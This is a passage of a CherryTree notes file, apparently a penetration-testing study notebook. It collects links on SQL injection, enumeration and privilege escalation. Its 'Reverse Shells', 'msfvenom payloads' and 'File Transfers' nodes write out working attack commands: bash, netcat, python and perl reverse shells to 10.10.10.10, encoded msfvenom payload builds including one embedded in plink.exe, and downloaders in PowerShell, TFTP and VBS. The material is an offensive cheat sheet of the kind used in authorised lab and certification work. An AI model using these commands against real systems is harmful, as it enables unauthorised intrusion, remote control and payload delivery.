		<rich_text link="webs http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet">http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet</rich_text>
		<rich_text>

•</rich_text>
		<rich_text weight="heavy"> MySQL Injection:</rich_text>
		<rich_text> </rich_text>
		<rich_text link="webs http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet">http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet</rich_text>
		<rich_text>

• </rich_text>
		<rich_text weight="heavy">MongoDB Nosql Injection:</rich_text>
		<rich_text> </rich_text>
		<rich_text link="webs https://security.stackexchange.com/questions/83231/mongodb-nosql-injection-in-python-code">https://security.stackexchange.com/questions/83231/mongodb-nosql-injection-in-python-code</rich_text>
		<rich_text>
  </rich_text>
		<rich_text link="webs http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet">http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet</rich_text>
	</node>
	<node custom_icon_id="0" foreground="" is_bold="False" name="Enumeration" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569179105.17" ts_lastsave="1572467773.87" unique_id="2">
		<rich_text>• </rich_text>
		<rich_text weight="heavy">General Enumeration - Common port checks:</rich_text>
		<rich_text> </rich_text>
		<rich_text link="webs http://www.0daysecurity.com/penetration-testing/enumeration.html">http://www.0daysecurity.com/penetration-testing/enumeration.html</rich_text>
		<rich_text>

• </rich_text>
		<rich_text weight="heavy">Nmap Scripts:</rich_text>
		<rich_text> </rich_text>
		<rich_text link="webs https://nmap.org/nsedoc/">https://nmap.org/nsedoc/</rich_text>
	</node>
	<node custom_icon_id="0" foreground="" is_bold="False" name="Shell Exploitation" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569179180.75" ts_lastsave="1572613669.18" unique_id="3">
		<rich_text>•</rich_text>
		<rich_text weight="heavy"> Reverse Shell</rich_text>
		<rich_text> Cheat Sheet: </rich_text>
		<rich_text link="webs http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</rich_text>
		<rich_text>
   ◇ More Reverse Shells: </rich_text>
		<rich_text link="webs https://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/">https://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/</rich_text>
		<rich_text>
   ◇ Even More Reverse shells: </rich_text>
		<rich_text link="webs https://delta.navisec.io/reverse-shell-reference/">https://delta.navisec.io/reverse-shell-reference/</rich_text>
		<rich_text>

• </rich_text>
		<rich_text weight="heavy">Spawning TTY Shell:</rich_text>
		<rich_text> </rich_text>
		<rich_text link="webs https://netsec.ws/?p=337">https://netsec.ws/?p=337</rich_text>
		<rich_text>

• </rich_text>
		<rich_text weight="heavy">Metasploit payloads (msfvenom):</rich_text>
		<rich_text> </rich_text>
		<rich_text link="webs https://netsec.ws/?p=331">https://netsec.ws/?p=331</rich_text>
		<rich_text>

•</rich_text>
		<rich_text weight="heavy"> Best Web Shells</rich_text>
		<rich_text>: </rich_text>
		<rich_text link="webs https://www.1337pwn.com/best-php-web-shells/">https://www.1337pwn.com/best-php-web-shells/</rich_text>
		<rich_text>
   ◇ </rich_text>
		<rich_text link="webs https://github.com/artyuum/Simple-PHP-Web-Shell">https://github.com/artyuum/Simple-PHP-Web-Shell</rich_text>
		<rich_text>
   ◇ </rich_text>
		<rich_text link="webs http://www.topshellv.com/">http://www.topshellv.com/</rich_text>
		<rich_text>

•</rich_text>
		<rich_text weight="heavy"> Escape from SHELLcatraz</rich_text>
		<rich_text>: </rich_text>
		<rich_text link="webs https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells?slide=10">https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells?slide=10</rich_text>
		<rich_text>


</rich_text>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Reverse Shells" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1572362853.62" ts_lastsave="1572613373.5" unique_id="13">
			<rich_text>• bash -i &gt;&amp; /dev/tcp/10.10.10.10/4443 0&gt;&amp;1

• rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 4443 &gt;/tmp/f

• nc -e /bin/sh 10.10.10.10 4443

• nc -e cmd.exe 10.10.10.10 4443

• python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.10.10&quot;,4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'

• perl -e 'use Socket;$i=&quot;10.10.10.10&quot;;$p=4443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Spawn TTY Shells" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1572613544.53" ts_lastsave="1572613599.18" unique_id="22">
			<rich_text>• python -c 'import pty; pty.spawn(&quot;/bin/sh&quot;)'
• echo os.system('/bin/bash')
• /bin/sh -i
• perl —e 'exec &quot;/bin/sh&quot;;'
• perl: exec &quot;/bin/sh&quot;;
• ruby: exec &quot;/bin/sh&quot;
• lua: os.execute('/bin/sh')
• (From within IRB): exec &quot;/bin/sh&quot;
• (From within vi): :!bash
• (From within vi): :set shell=/bin/bash:shell
• (From within nmap): !sh</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="msfvenom payloads" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1572362943.32" ts_lastsave="1572362944.62" unique_id="14">
			<rich_text># PHP reverse shell  
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f raw -o shell.php

# Java WAR reverse shell  
msfvenom -p java/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f war -o shell.war

# Linux bind shell  
msfvenom -p linux/x86/shell_bind_tcp LPORT=4443 -f c -b &quot;\x00\x0a\x0d\x20&quot; -e x86/shikata_ga_nai

# Linux FreeBSD reverse shell  
msfvenom -p bsd/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f elf -o shell.elf

# Linux C reverse shell  
msfvenom  -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f c

# Windows non staged reverse shell  
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f exe -o non_staged.exe

# Windows Staged (Meterpreter) reverse shell  
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f exe -o meterpreter.exe

# Windows Python reverse shell  
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 EXITFUNC=thread -f python -o shell.py

# Windows ASP reverse shell  
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f asp -e x86/shikata_ga_nai -o shell.asp

# Windows ASPX reverse shell
msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -o shell.aspx

# Windows JavaScript reverse shell with nops  
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f js_le -e generic/none -n 18

# Windows Powershell reverse shell  
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -i 9 -f psh -o shell.ps1

# Windows reverse shell excluding bad characters  
msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=10.10.10.10 LPORT=4443 EXITFUNC=thread -f c -b &quot;\x00\x04&quot; -e x86/shikata_ga_nai

# Windows x64 bit reverse shell  
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f exe -o shell.exe

# Windows reverse shell embedded into plink  
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="File Transfers" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1572613669.18" ts_lastsave="1572613749.56" unique_id="23">
			<rich_text></rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="HTTP" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1572613677.82" ts_lastsave="1572613682.87" unique_id="24">
				<rich_text># In Kali
python -m SimpleHTTPServer 80

# In reverse shell - Linux
wget 10.10.10.10/file

# In reverse shell - Windows
powershell -c &quot;(new-object System.Net.WebClient).DownloadFile('http://10.10.10.10/file.exe','C:\Users\user\Desktop\file.exe')&quot;</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="FTP" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1572613691.78" ts_lastsave="1572613696.54" unique_id="25">
				<rich_text># In Kali
python -m pyftpdlib -p 21 -w

# In reverse shell
echo open 10.10.10.10 &gt; ftp.txt
echo USER anonymous &gt;&gt; ftp.txt
echo ftp &gt;&gt; ftp.txt 
echo bin &gt;&gt; ftp.txt
echo GET file &gt;&gt; ftp.txt
echo bye &gt;&gt; ftp.txt

# Execute
ftp -v -n -s:ftp.txt

“Name the filename as ‘file’ on your kali machine so that you don’t have to re-write the script multiple names, you can then rename the file on windows.”</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="TFTP" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1572613730.76" ts_lastsave="1572613736.09" unique_id="26">
				<rich_text># In Kali
atftpd --daemon --port 69 /tftp

# In reverse shell
tftp -i 10.10.10.10 GET nc.exe</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="VBS" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1572613749.56" ts_lastsave="1572613772.58" unique_id="27">
				<rich_text>If FTP/TFTP fails you, this wget script in VBS is the go to on Windows machines.

# In reverse shell
echo strUrl = WScript.Arguments.Item(0) &gt; wget.vbs
echo StrFile = WScript.Arguments.Item(1) &gt;&gt; wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &gt;&gt; wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &gt;&gt; wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &gt;&gt; wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &gt;&gt; wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts &gt;&gt; wget.vbs
echo Err.Clear &gt;&gt; wget.vbs
echo Set http = Nothing &gt;&gt; wget.vbs
echo Set http = CreateObject(&quot;WinHttp.WinHttpRequest.5.1&quot;) &gt;&gt; wget.vbs
echo If http Is Nothing Then Set http = CreateObject(&quot;WinHttp.WinHttpRequest&quot;) &gt;&gt; wget.vbs
echo If http Is Nothing Then Set http = CreateObject(&quot;MSXML2.ServerXMLHTTP&quot;) &gt;&gt; wget.vbs
echo If http Is Nothing Then Set http = CreateObject(&quot;Microsoft.XMLHTTP&quot;) &gt;&gt; wget.vbs
echo http.Open &quot;GET&quot;,strURL,False &gt;&gt; wget.vbs
echo http.Send &gt;&gt; wget.vbs
echo varByteArray = http.ResponseBody &gt;&gt; wget.vbs
echo Set http = Nothing &gt;&gt; wget.vbs
echo Set fs = CreateObject(&quot;Scripting.FileSystemObject&quot;) &gt;&gt; wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) &gt;&gt; wget.vbs
echo strData = &quot;&quot; &gt;&gt; wget.vbs
echo strBuffer = &quot;&quot; &gt;&gt; wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) &gt;&gt; wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) &gt;&gt; wget.vbs
echo Next &gt;&gt; wget.vbs
echo ts.Close &gt;&gt; wget.vbs

# Execute
cscript wget.vbs http://10.10.10.10/file.exe file.exe</rich_text>
			</node>
		</node>
	</node>
	<node custom_icon_id="0" foreground="" is_bold="False" name="Privilege Escalation" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569179376.52" ts_lastsave="1572356018.41" unique_id="4">
		<rich_text>Common priviledge escalation exploits and scripts: </rich_text>
		<rich_text link="webs https://github.com/AusJock/Privilege-Escalation">https://github.com/AusJock/Privilege-Escalation</rich_text>
		<rich_text>
</rich_text>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Linux" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569179386.29" ts_lastsave="1572356447.65" unique_id="5">
			<rich_text>• </rich_text>
			<rich_text weight="heavy">Linux EoP (Best privesc):</rich_text>
			<rich_text> </rich_text>
			<rich_text link="webs https://guif.re/linuxeop">https://guif.re/linuxeop</rich_text>
			<rich_text>

• </rich_text>
			<rich_text weight="heavy">Basic Linux Privilege Escalation</rich_text>
			<rich_text>: </rich_text>
			<rich_text link="webs https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</rich_text>
			<rich_text>

• </rich_text>
			<rich_text weight="heavy">unix-privesc-check</rich_text>
			<rich_text>: </rich_text>
			<rich_text link="webs http://pentestmonkey.net/tools/audit/unix-privesc-check">http://pentestmonkey.net/tools/audit/unix-privesc-check</rich_text>
			<rich_text>

• </rich_text>
			<rich_text weight="heavy">linuxprivchecker.py:</rich_text>
			<rich_text> </rich_text>
			<rich_text link="webs http://www.securitysift.com/download/linuxprivchecker.py">http://www.securitysift.com/download/linuxprivchecker.py</rich_text>
			<rich_text>

• </rich_text>
			<rich_text weight="heavy">Linux Enumeration:</rich_text>
			<rich_text> </rich_text>
			<rich_text link="webs https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</rich_text>
			<rich_text>

• </rich_text>
			<rich_text weight="heavy">pspy:</rich_text>
			<rich_text> </rich_text>
			<rich_text link="webs https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</rich_text>
			<rich_text>

• </rich_text>
			<rich_text weight="heavy">Linux Priv Checker:</rich_text>
			<rich_text> </rich_text>
			<rich_text link="webs https://github.com/sleventyeleven/linuxprivchecker">https://github.com/sleventyeleven/linuxprivchecker</rich_text>
			<rich_text>

• </rich_text>
			<rich_text weight="heavy">Kernel Exploits</rich_text>
			<rich_text>: </rich_text>
			<rich_text link="webs https://github.com/lucyoa/kernel-exploits">https://github.com/lucyoa/kernel-exploits</rich_text>
			<rich_text>

• </rich_text>
			<rich_text weight="heavy">PrivEsc binaries:</rich_text>
			<rich_text> </rich_text>
			<rich_text link="webs https://gtfobins.github.io/">https://gtfobins.github.io/</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Windows" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569179638.15" ts_lastsave="1572356540.62" unique_id="6">
			<rich_text>• </rich_text>
			<rich_text weight="heavy">Windows Privilege Escalation Fundamentals:</rich_text>
			<rich_text> </rich_text>
			<rich_text link="webs http://www.fuzzysecurity.com/tutorials/16.html">http://www.fuzzysecurity.com/tutorials/16.html</rich_text>
			<rich_text>

• </rich_text>
			<rich_text weight="heavy">Windows-Exploit-Suggester:</rich_text>
			<rich_text> </rich_text>
			<rich_text link="webs https://github.com/GDSSecurity/Windows-Exploit-Suggester">https://github.com/GDSSecurity/Windows-Exploit-Suggester</rich_text>
			<rich_text>

•</rich_text>
			<rich_text weight="heavy"> winprivesc</rich_text>
			<rich_text>: </rich_text>
			<rich_text link="webs https://github.com/joshruppe/winprivesc">https://github.com/joshruppe/winprivesc</rich_text>
			<rich_text>

• </rich_text>
			<rich_text weight="heavy">Windows Privilege Escalation Guide:</rich_text>
			<rich_text> </rich_text>
			<rich_text link="webs https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/">https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/</rich_text>
			<rich_text>

• </rich_text>
			<rich_text weight="heavy">Windows-Privesc:</rich_text>
			<rich_text> </rich_text>
			<rich_text link="webs https://github.com/togie6/Windows-Privesc">https://github.com/togie6/Windows-Privesc</rich_text>
			<rich_text>

• </rich_text>
			<rich_text weight="heavy">WindowsExploits:</rich_text>
			<rich_text> </rich_text>
			<rich_text link="webs https://github.com/abatchy17/WindowsExploits">https://github.com/abatchy17/WindowsExploits</rich_text>
			<rich_text>

• </rich_text>
			<rich_text weight="heavy">PowerSploit:</rich_text>
			<rich_text> </rich_text>
			<rich_text link="webs https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc</rich_text>
			<rich_text>

• </rich_text>
			<rich_text weight="heavy">Windows EoP:</rich_text>
			<rich_text> </rich_text>
			<rich_text link="webs https://guif.re/windowseop">https://guif.re/windowseop</rich_text>
			<rich_text>

• </rich_text>
			<rich_text weight="heavy">OSCP Notes:</rich_text>
			<rich_text> </rich_text>
			<rich_text link="webs https://securism.wordpress.com/oscp-notes-privilege-escalation-windows/">https://securism.wordpress.com/oscp-notes-privilege-escalation-windows/</rich_text>
			<rich_text>

• </rich_text>
			<rich_text weight="heavy">PrivEsc Binaries:</rich_text>
			<rich_text> </rich_text>
			<rich_text link="webs https://lolbas-project.github.io/">https://lolbas-project.github.io/</rich_text>
		</node>
	</node>
</cherrytree>
